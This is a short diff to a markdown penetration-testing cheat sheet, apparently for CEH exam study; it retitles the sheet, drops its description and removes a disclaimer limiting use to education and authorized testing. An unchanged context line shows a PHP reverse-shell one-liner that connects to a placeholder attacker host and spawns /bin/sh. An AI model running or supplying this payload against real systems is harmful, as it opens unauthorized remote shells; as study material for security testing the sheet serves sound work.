@@ -1,6 +1,5 @@
-# 🛡️ Cybersecurity & Malware Analysis: Golden Cheat Sheet
+# CEH Cheat Sheet
 
-A comprehensive collection of commands, methodologies, and tool configurations for penetration testing and binary analysis.
 
 ---
 
@@ -89,4 +88,3 @@ A comprehensive collection of commands, methodologies, and tool configurations f
 * **PHP:** `php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
 ---
-> **Disclaimer:** This document is for educational purposes and authorized penetration testing only.
